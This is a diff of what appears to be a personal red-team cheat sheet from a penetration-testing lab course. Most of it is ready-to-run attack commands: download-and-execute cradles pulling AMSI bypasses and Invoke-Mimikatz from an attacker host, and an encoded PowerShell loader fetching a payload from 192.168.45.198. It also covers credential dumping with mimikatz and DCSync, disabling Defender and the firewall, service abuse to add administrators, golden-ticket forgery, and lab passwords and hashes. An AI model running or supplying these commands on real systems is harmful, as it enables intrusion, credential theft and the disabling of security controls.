@@ -137,6 +137,8 @@ sudo ip tuntap add user kali mode tun ligolo;sudo ip link set ligolo up;sudo pro
 .\agent.exe -connect $LHOST:443 -ignore-cert
 #Listener
 sudo ip route add 172.16.201.0/24 dev ligolo
+#Create shellcode
+donut -f 1 -o agent198_443.bin -a 2 -p "-connect 192.168.45.198:443 -ignore-cert" -i /serve/basic/agent.exe
 
 ===sliver-tunelling
 #portfwd
@@ -307,6 +309,11 @@ same as linux, use dll instead of so
 #nxc-mssql
 nxc mssql -username user -administrator admin -x whoami
 nxc mssql dc01.corp1.com -u Offsec -p lab -q 'EXEC xp_dirtree '\\\\$LHOST\\kali';'
+
+#linux-mssql
+mssqlpwner localuser<:password>@$RHOST -hashes <:hash> <action>
+mssqlpwner domain.com/user<:password>@$RHOST  -windows-auth enumerate
+mssqlpwner localuser@$RHOST -hashes ':hash' -windows-auth interactive
 
 #sliver-mssql
 sliver (mssqland_local_auth) > mssqland /c:local /u:localuser /p:password /h:sql01 /action:whoami
@@ -680,7 +687,7 @@ sliver (SHELL) > execute -o "c:\windows\system32\cmd.exe /c whoami /all"
 ===powershell-execution
 sliver (SHELL) > sharpsh -t 20 -- '-c "whoami /all"'
 #long-commands
-sliver (SHELL) > sharpsh -i -t 40 -- '-u http://$LHOST/serve/basic/pv.ps1 -e -c super-long-command'
+sliver (SHELL) > sharpsh -i -t 40 -- '-u http://$LHOST/basic/pv.ps1 -e -c super-long-command'
 
 
 ===donut===
@@ -765,26 +772,26 @@ sliver (CLM_ENUM) > sharpsh -t 20 -- '-c "$ExecutionContext.SessionState.Languag
 PS C:\MpCmdRun> & 'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All
 sliver (DisableAV) > sharpsh -t 20 -- '-c "cmd /c \"C:\Program Files\Windows Defender\MpCmdRun.exe\" -RemoveDefinitions -All"'
 sliver (DisableAV) > sharpsh -t 20 -- -c \"Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true\"
-sliver (DefendersDeath) > sharpsh -t 20 -- -u 'http://$LHOST/serve/basics/DefendersDeath.ps1' -c 1
+sliver (DefendersDeath) > sharpsh -t 20 -- -u 'http://$LHOST/basics/DefendersDeath.ps1' -c 1
 
 ===lsa-ppl-bypass
 mimikatz # !+
 mimikatz # !processprotect /process:lsass.exe /remove
 
 ===in-mem-mimikatz
-(New-Object System.Net.WebClient).DownloadString('http://$LHOST/serve/basic/amsibypass.txt') | IEX
-(New-Object System.Net.WebClient).DownloadString('http://$LHOST/serve/basic/invmmk.txt') | IEX; Invoke-Mimikatz -Command "`"privilege::debug`" `"token::elevate`" `"!+`" `"!processprotect /process:lsass.exe /remove`" `"log mmk.log`" `"sekurlsa::logonpasswords`""
+(New-Object System.Net.WebClient).DownloadString('http://$LHOST/basic/amsibypass.txt') | IEX
+(New-Object System.Net.WebClient).DownloadString('http://$LHOST/basic/invmmk.txt') | IEX; Invoke-Mimikatz -Command "`"privilege::debug`" `"token::elevate`" `"!+`" `"!processprotect /process:lsass.exe /remove`" `"log mmk.log`" `"sekurlsa::logonpasswords`""
 
 ===run-in-memory
 (New-Object System.Net.WebClient).DownloadString('http://$LHOST/payload.txt') | IEX
-sliver (SHELL) > execute-shellcode /ps64rev.bin -p <pid-migrate>
+sliver (SHELL) > execute-shellcode /shellcode.bin -p <pid-migrate>
 sliver (SHELL) > execute-assembly /Stracciatella.exe -c "$ExecutionContext.SessionState.LanguageMode"
 #sliver-hollowing
 sliver (SHELL) > hollow svchost.exe /home/kali/sliver.x64.bin
 
 ===clm-amsi-applocker-bypass
 #amsi-bypass
-(new-object system.net.webclient).downloadstring('http://$LHOST/serve/basic/amsibypass.txt') | IEX
+(new-object system.net.webclient).downloadstring('http://$LHOST/basic/amsibypass.txt') | IEX
 
 #applocker-bypass
 ##rundll in trusted location
@@ -798,7 +805,7 @@ wscript "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe .\FullBypass.csproj
 	#Start rrev listener
 	#Use in-memory-processes to avoid reverting to ConstrainedLanguage, Import-Module will revert
-	(New-Object System.Net.WebClient).DownloadString('http://$LHOST/serve/basic/pv.ps1') | IEX
+	(New-Object System.Net.WebClient).DownloadString('http://$LHOST/basic/pv.ps1') | IEX
 
 ===installutil
 1# create exec payload, put runner function into Uninstall function (Idk if Install also can)
@@ -988,7 +995,7 @@ sudo vim output.txt
 #check ~/hacked.txt
 
 ================================windows=====================================
-===windows-enum===
+===windows-enumeration===
 ===pwn.ps1 (auto-grab all essential windows files)
 powershell -ep bypass -c 'iex(iwr -uri $LHOST/pwn.ps1 -usebasicparsing)'
 
@@ -1027,20 +1034,41 @@ Get-ItemProperty 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Un
 Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' | select displayname
 
 ===env-path-permissions
+cmd /c "for %A in ('%path:;=';'%') do @( cmd.exe /c icacls `"%~A`" 2>nul | findstr /i `"(F`) `(M`) `(W`) :\`" | findstr /i `":\\ everyone authenticated users todos %username%`" && echo. )"
+
 for %A in ('%path:;=';'%') do ( cmd.exe /c icacls '%~A' 2>nul | findstr /i '(F) (M) (W) :\' | findstr /i ':\\ everyone authenticated users todos %username%' && echo. )
 
 ===querying-services
 cmd/c sc query serviceName
-===modifiable-service
-sliver (modifiable-service) > execute -o sc qc SNMPTRAP
+sliver (queryservice) > execute -o sc qc SNMPTRAP
 
 ===running-services
+#All running services
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
-Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where { $_.PathName -notlike 'C:\Windows*' } | select Name,DisplayName,StartMode,PathName
+
+#Non-Standard windows services
+Get-WmiObject -Class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where-Object {$_.PathName -notlike 'C:\Windows*' -and $_.PathName -notlike ''} | Select-Object Name,DisplayName,StartMode,PathName
+
+===modifiable-services
+Get-Service | ForEach-Object {
+    try {
+        $originalDisplayName = $_.DisplayName
+        Set-Service -Name $_.Name -DisplayName $originalDisplayName -ErrorAction Stop
+        Write-Host "MODIFIABLE: $($_.Name) - $($_.DisplayName)" -ForegroundColor Red
+    }
+    catch {
+        # Service is not modifiable
+    }
+}
+
 
 ===unquoted-service
-wmic service get name,displayname,startmode,pathname | findstr /i /v 'C:\Windows\\' |findstr /i /v '''
-Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike 'C:\Windows*' -and $_.PathName -notlike ''*'} | select Name,DisplayName,StartMode,PathName
+Get-WmiObject -Class Win32_Service | Where-Object {
+    $_.PathName -match '\s' -and 
+    $_.PathName -notmatch '^".*"' -and 
+    $_.PathName -notlike 'C:\Windows\*'
+} | Select-Object Name, DisplayName, PathName, StartMode
+
 
 ===scheduled-tasks
 #Powershell
@@ -1147,11 +1175,10 @@ Invoke-AllChecks
 #JuicyPotato
 .\Juicy.Potato.x86.exe -l 1337 -c '{4991d34b-80a1-4291-83b6-3328366b9097}' -p c:\windows\system32\cmd.exe -a '/c whoami' -t *
 #sliver-printpoofer
-##runs ".\PrintSpoofer64.exe -p '-c c:\\windows\\temp\\rev.exe'"
-sliver (PS64REV.bin) > execute-shellcode /ps64rev.bin -p <pid-migrate>
+sliver (PS64) > execute-shellcode /ps64rev.bin -p <pid-migrate> ##runs ".\PrintSpoofer64.exe -p '-c c:\\windows\\temp\\rev.exe'"
 
 ===modifiable-service
-sliver (modifiable-service) > execute -o sc config SNMPTRAP binPath= "net localgroup Administrators DOMAIN\\user /add" obj= "NT AUTHORITY\\SYSTEM"
+sliver (modifiable-service) > execute -o sc config SNMPTRAP binPath= "net localgroup Administrators FINAL\\nina /add" obj= "NT AUTHORITY\\SYSTEM"
 sliver (modifiable-service) > execute -o sc config SNMPTRAP start= auto
 sliver (modifiable-service) > execute -o sc qc SNMPTRAP
 sliver (modifiable-service) > execute -o sc start SNMPTRAP
@@ -1219,14 +1246,15 @@ mimikatz # privilege::debug
 mimikatz # log mmk.log
 mimikatz # sekurlsa::logonpasswords
 mimikatz # lsadump::sam
-mimikatz # lsadump::secrets
-mimikatz # lsadump::cache
+mimikatz # lsadump::secrets ---> grep for cur/text to find plaintext-passwords
+mimikatz # lsadump::cache ---> mscachev2 useless if cannot crack
 #specify SAM & SYSTEM
 lsadump::sam /system:C:\Windows\Repair\SYSTEM /sam:C:\Windows\Repair\SAM
 
 #mimikatz-one-liner
-mimikatz '"privilege::debug" "token::elevate" "log mmk.log" "sekurlsa::logonpasswords"'
-mimikatz '"privilege::debug" "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "log mmk.log" "sekurlsa::logonpasswords"'
+mimikatz '"privilege::debug" "token::elevate" "log mmk.log" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "exit"'
+
+mimikatz '"privilege::debug" "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "log mmk.log" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "exit"'
 
 ##lsass-dump
 mimikatz "token::elevate" "log mmk.log" "sekurlsa::logonpasswords" "sekurlsa::dpapi" "sekurlsa::ekeys" "sekurlsa::wdigest ""exit"
@@ -1241,7 +1269,7 @@ mimikatz '"token::elevate" "vault::cred /patch" "exit"'
 #sliver-mimikatz
 sliver (mimikatz) > upload /serve/basic/mimidrv.sys c:\\windows\\temp\\
 sliver (mimikatz) > cd c:\\windows\\temp\\
-sliver (mimikatz) > mimikatz "\"privilege::debug\" \"token::elevate\" \"!+\" \"!processprotect /process:lsass.exe /remove\" \"log mmk.log\" \"sekurlsa::logonpasswords\""
+sliver (mimikatz) > mimikatz "\"privilege::debug\" \"token::elevate\" \"!+\" \"!processprotect /process:lsass.exe /remove\" \"log mmk.log\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" \"lsadump::secrets\" \"lsadump::cache\" \"exit\""
 
 #msfconsole-kiwi
 msfconsole> getsystem
@@ -1350,7 +1378,7 @@ sharprdp.exe computername=appsrv01 command='powershell (New-Object System.Net.We
 
 #RestrictedAdmin PTH
 
-xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6 /cert-ignore /dynamic-resolution /drive:kali, "$(pwd)"
+xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6 /cert-ignore /dynamic-resolution /drive:kali,"$(pwd)"
 
 mimikatz # sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:'mstsc.exe /restrictedadmin'
 
@@ -1586,6 +1614,13 @@ export KRB5CCNAME=/tmp/krb5cc_minenow
 impacket-ticketConverter tgt.kirbi tgt.ccache
 
 ================================persistence=====================================
+===persistence-one-liner aio
+Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true; reg add 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f; reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f; netsh advfirewall set allprofiles state off ; Enable-PSRemoting -Force
+
+===persistence-sliver-shell
+#RefC pwsh loader (198_6464_HolOb.exe)
+powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEAOQA4AC8AUgBlAGYAQwAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA=
+
 ===windows-add-user
 sliver (add-user) > sharpsh -- '-c "net user /add kali p@ssword123; net localgroup administrators kali /add; net localgroup \"remote desktop users\" kali /add"
 net user /add kali p@ssword123; net localgroup administrators kali /add; net localgroup 'remote desktop users' kali /add
@@ -1593,6 +1628,7 @@ net user /add kali p@ssword123; net localgroup administrators kali /add; net loc
 ===RDP===
 ===enable-rdp
 sliver (enable-rdp) > sharpsh -- '-c "reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f; reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f ; netsh advfirewall set allprofiles state off'
+
 reg add 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f; reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f; netsh advfirewall set allprofiles state off
 
 ===rdp-pth
@@ -1634,6 +1670,11 @@ export KRB5CCNAME=ticket.ccache
 
 ===nxc
 nxc [smb/ftp/ssh/rdp...] mail.com -u john -p password-list [--continue-on-success]
+
+#Non-domain authentication (Machine level)
+nxc [smb/ftp/ssh/rdp...] machine01 -u machine01\user ...
+
+#Use local auth of the particular servie
 nxc [smb/ftp/ssh/rdp...] ... --local-auth
 
 #modules
@@ -1652,11 +1693,22 @@ nxc winrm target.com -u user -p password -x whoami
 #use-ccache
 nxc smb ... --use-kcache # KRB5CCNAME is set
 nxc smb ... --use-kcache --kcache-file /path/to/ticket.ccache
+## REMINDER: add DC ip into /etc/resolv.conf & ensure its above other nameserver entries for priority resolving
+#####
+#nameserver 172.16.148.168
+#nameserver 172.16.148.160
+#nameserver 172.16.148.165
+#nameserver 8.8.8.8
+#nameserver 8.8.4.4
+#####
 
 ===bloodyAD
 bloodyAD --host <DC01> -d <domain> -u <username> -p <password> <add/get/remove/set> <options...>
 bloodyAD --host <DC01> -d <domain> -u <username> -p <:hash> <add/get/remove/set> <options...>
 
+===linux-powerview #pywerview
+powerview complyedge/pete@dmzdc01 -H "61c6e14f88cd70638f901ea51796a194"
+powerview ops.comply/pete:0998ASDaas2@cdc07 -q 'Get-DomainTrust'
 ===ldapsearch
 #get naming contexts
 ldapsearch -x -H ldap://$TARGET -s base namingcontexts
@@ -1664,7 +1716,6 @@ ldapsearch -x -H ldap://$TARGET -s base namingcontexts
 ldapsearch -x -H ldap://$TARGET -b 'dc=hutch,dc=offsec'
 #use kerberos authentication
 ldapsearch -Y GSSAPI -x -H ldap://$TARGET -b 'dc=hutch,dc=offsec'
-
 
 ===ad-enumeration===
 ===bloodhound
@@ -1674,6 +1725,8 @@ sliver (sharphound) > sharp-hound-4 -- '-C all'
 iex(new-object net.webclient).downloadstring('http://$LHOST:8000/Invoke-Sharphound.ps1'); Invoke-Sharphound - CollectionMethod All,GPOLocalGroup -Domain *domain*; Invoke-Sharphound -CollectionMethod All -Domain *domain*
 #bloodhound-python
 bloodhound-python -d heist.offsec -u enox -p california -c all -ns 192.168.153.165
+bloodhound-ce-python -d comply.com -u 'pete@ops.comply.com' -p 0998ASDaas2 -c 'All' -ns 172.16.115.160 --zip
+bloodhound-ce-python -d ops.comply.com -u 'pete@complyedge.com' --hashes :61c6e14f88cd70638f901ea51796a194 -c 'All' -ns 172.16.115.160 --zip
 
 #Start bloodhound-server
 bloodhound <admin:P@ssw0rd123!> -> http://127.0.0.1:8080
@@ -1685,8 +1738,8 @@ sudo neo4j console <neo4j:kali> -> http://127.0.0.1:7474
 1. Overview of all entities search Everyone@domain.com -> click members
 
 ===adpeas
-sliver (adpeas) > sharpsh -t 200 -- '-u http://$LHOST/serve/basic/adPEAS.ps1 -c "Invoke-adPEAS"'
-sliver (adpeas) > sharpsh -t 200 -- '-u http://$LHOST/serve/basic/adPEAS-Light.ps1 -c "Invoke-adPEAS"'
+sliver (adpeas) > sharpsh -t 200 -- '-u http://$LHOST/basic/adPEAS.ps1 -c "Invoke-adPEAS"'
+sliver (adpeas) > sharpsh -t 200 -- '-u http://$LHOST/basic/adPEAS-Light.ps1 -c "Invoke-adPEAS"'
 
 ===adsearch
 # List down all users - we get the trust user as well -> CORP1$
@@ -1709,7 +1762,8 @@ $env:computername
 [wmi] "Win32_userAccount.Domain='client',Name='Administrator'"
 
 ===basic-Enum
-bloodyAD --host DC01 -d $domain -u <username> -p <password> / <:hash> get object <Target>
+bloodyAD --host DC01 -d $domain -u <username> -p <:hash> get writable
+bloodyAD --host DC01 -d $domain -u <username> -p <password> get object <Target>
 PS C:\Powerview > Get-DomainComputer
 PS C:\Powerview > Get-NetComputer
 PS C:\Powerview > Get-NetGroup 'Group Name'
@@ -1718,9 +1772,12 @@ PS C:\Powerview > Get-NetGroup 'Group Name'
 sliver (sharpview) > sharpview -- 'Get-DomainComputer'
 sliver (sharpview) > sharpview -- 'Get-DomainComputer machine03.domain.com'
 #pv.ps1
-sliver (pv.ps1) > sharpsh -- '-u http://$LHOST/serve/basic/pv.ps1 -c Get-DomainGroup \"Domain Admins\""'
+sliver (pv.ps1) > sharpsh -- '-u http://$LHOST/basic/pv.ps1 -c Get-DomainGroup \"Domain Admins\""'
 #B64Encoded Get-DomainGroup "Domain Admins"
-sliver (pv.ps1) > sharpsh -- '-u http://$LHOST/serve/basic/pv.ps1 -e -c RwBlAHQALQBEAG8AbQBhAGkAbgBHAHIAbwB1AHAAIAAiAEQAbwBtAGEAaQBuACAAQQBkAG0AaQBuAHMAIgA='
+sliver (pv.ps1) > sharpsh -- '-u http://$LHOST/basic/pv.ps1 -e -c RwBlAHQALQBEAG8AbQBhAGkAbgBHAHIAbwB1AHAAIAAiAEQAbwBtAGEAaQBuACAAQQBkAG0AaQBuAHMAIgA='
+
+sliver (pv.ps1) > sharpsh -- '-u http://$LHOST/basic/pv.ps1 -c "Set-DomainObject -Identity 'target' -Set @{serviceprincipalname=\"nonexistent/hacking\"}"'
+sliver (pv.ps1) > sharpsh -- '-u http://$LHOST/basic/pv.ps1 -c "Get-DomainSPNTicket -SPN pwned/service -OutputFormat Hashcat | fl"'
 
 ===Scan network to find where current user has admin perms
 PS C:\Powerview > Find-LocalAdminAccess
@@ -1766,6 +1823,8 @@ Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Memb
 sliver (enum-sql-spn) > sqlrecon -- /enum:sqlspns
 PS C:\Target > setspn -T DOMAIN -Q MSSQLSvc/*
 PS C:\Target > . .\GetUserSPNs.ps1
+linux-mssql # mssqlpwner ./Administrator@sql03 -hashes ':8388d07604009d14cbb78f7d37b9e887' -windows-auth enumerate
+
 #enumerate-impersonatable-logins
 sliver (mssqland_token_auth) > mssqland /c:token /h:sql01 /a:impersonate
 SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
@@ -1776,6 +1835,9 @@ sliver (enum_mssql_links) > mssqland -- /h:sql11 /c:token /a:links
 sliver (enum_mssql_links) > sqlrecon -- /h:sql11 /a:wintoken /m:links
 nxc mssql 192.168.160.140 -u Administrator -H 5c3e856f452d9cecc5801a954ab22122 -M enum_links
 EXEC sp_linkedservers;
+
+mssqlpwner-linked-Enum # get-chain-list
+
 #enumerate-linked-maps
 sliver (enum_mssql_linkmaps) > mssqland -- /h:sql11 /c:token /a:linkmap
 
@@ -1790,7 +1852,7 @@ select version from openquery('dc01', 'select @@version as version');
 ===ad-forest-enumeration===
 #sharphound-forests
 sliver (sharphound) > sharp-hound-4 -- '-C all --searchforest'
-sharpsh -t 20 -- '-u http://$LHOST/serve/basic/SharpHound.ps1 -c "Invoke-BloodHound -CollectionMethod All,GPOLocalGroup -SearchForest"'
+sharpsh -t 20 -- '-u http://$LHOST/basic/SharpHound.ps1 -c "Invoke-BloodHound -CollectionMethod All,GPOLocalGroup -SearchForest"'
 
 #Enumerate all forest trusts (Big picture: which forests are connected)
 ([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
@@ -1819,7 +1881,7 @@ PS C:\Powerview > Get-DomainGPOUserLocalGroupMapping
 
 # Get forest groups accessible to our forest with SID >= 1000 - For SID filtering (base64 encode on cyberchef)
 Get-DomainGroup -LDAPFilter "(objectSID>=S-1-5-21-201072640-2662162558-1369012345-1000)" -Domain domain.com | select cn,memberof,objectSID
-sharpsh -i -t 20 -- -u http://$LHOST/serve/basic/PowerView.ps1 -e -c R2V0LURvbWFpbkdyb3VwIC1MREFQRmlsdGVyICIob2JqZWN0U0lEPj1TLTEtNS0yMS0yMDEwNzI2NDAtMjY2MjE2MjU1OC0xMzY5MDEyMzQ1LTEwMDApIiAtRG9tYWluIGRvbWFpbi5jb20gfCBzZWxlY3QgY24sbWVtYmVyb2Ysb2JqZWN0U0lE
+sharpsh -i -t 20 -- -u http://$LHOST/basic/PowerView.ps1 -e -c R2V0LURvbWFpbkdyb3VwIC1MREFQRmlsdGVyICIob2JqZWN0U0lEPj1TLTEtNS0yMS0yMDEwNzI2NDAtMjY2MjE2MjU1OC0xMzY5MDEyMzQ1LTEwMDApIiAtRG9tYWluIGRvbWFpbi5jb20gfCBzZWxlY3QgY24sbWVtYmVyb2Ysb2JqZWN0U0lE
 
 ===ad-attacks===
 ===kerberoasting-asreproasting
@@ -2024,7 +2086,14 @@ xp_dirtree \\$LHOST\kali
 ===mssql-linked-exec
 #mssqland
 mssqland -- /c:token /h:sql11:webapp11 /l:sql27 /action:pwsh "whoami"
-mssqland -- /c:token /h:sql11:webapp11 /l:sql27 /action:pwshdl '192.168.45.173/173_6464_ps.txt'
+mssqland -- /c:token /h:sql11:webapp11 /l:sql27 /action:pwshdl '$LHOST/rev_ps.txt'
+
+#mssqlpwner
+##
+mssqlpwner-linked-exec # set-chain
+mssqlpwner-linked-exec # exec 'powershell -enc ...'
+##
+mssqlpwner localuser:password@10.10.200.130 -link-name SQL03 exec 
 
 #queries
 EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT DC01
@@ -2089,16 +2158,30 @@ klist
 2# Dump the krbtgt hash from the child domain (for ticket forgery)
 mimikatz # lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
 
+##nxc-dcsync
+nxc smb DC01 -u user -p pass -d domain.com --ntds | grep krbtgt
+
 3# Enumerate Domain SIDs  
 Get-DomainSID -Domain prod.corp1.com  
 Get-DomainSID -Domain corp1.com  
 
+##bloodyAD-Get-DomainSID
+bloodyAD -d ops.comply.com -u pete -p 0998ASDaas2 --host comply.com get object "DC=comply,DC=com" --attr objectSid
+
+##pywerview-Get-DomainSID
+powerview -q "Get-Domain" ops.comply.com/pete:0998ASDaas2@ops.comply.com | grep sid
+
 4# Forge Golden Ticket with ExtraSID (Might fail if SID filtering is enforced on the trust)
+##impacket-ticketer-ExtraSID
+impacket-ticketer -nthash "<krbtgt_hash>" -domain ops.comply.com -domain-sid <child_domain_SID> -extra-sid <root_domain_SID>-519 h4x
+nxc smb rdc02 --use-kcache --ntds -> wont be able to perform code-exec yet
+
+##mimikatz-golden-ticket-ptt
 mimikatz # kerberos::golden /user:h4x /domain:prod.corp1.com /sid:<corp1_SID> /krbtgt:<hash> /sids:<corp2_SID>-519 /ptt
+PS C:\ > PsExec.exe \\rdc01 cmd
 
-5# Abuse golden ticket
-PsExec.exe \\rdc01 cmd
-
+===Extra-SID (Automated)
+impacket-raiseChild -target-exec rdc02 ops.comply.com/pete -> provide password when prompted
 
 ===Golden tickets across forest trusts
 1# Force cross-domain authentication & check tickets  
@@ -2149,14 +2232,21 @@ EXEC sp_linkedservers;
 -- Quick proof of code execution across linked servers
 EXEC ('xp_cmdshell 'whoami'') AT [linkedserver]
 
-=========================================DEBUGGING==============================================
-===debug-payloads
+=========================================SANITY-CHECKs==============================================
+===payloads
 1. architecture 
 2. port number
 3. staged-listener 2nd stage (Linux/ windows/ x64/ x86)
 4. Linux payload - gcc version?
 5. listnening ip
 
-===
+===authentications
+1. authenticate with correct domain (complyedge.com\jim not jim)
+2. ensure that kdc/ dc ip is added in /etc/hosts /etc/resolv.conf (do nslookup to verify)
+3. tried ALL protocols? taking v long != cannot authenticate
+	if have creds might be RDP (rdp only accept creds by default)
+4. try local user/ admin with MACHINE\Administrator or MACHINE\User
+5. really create a userlist and passlist/hashlist and just spray target
+
 
 
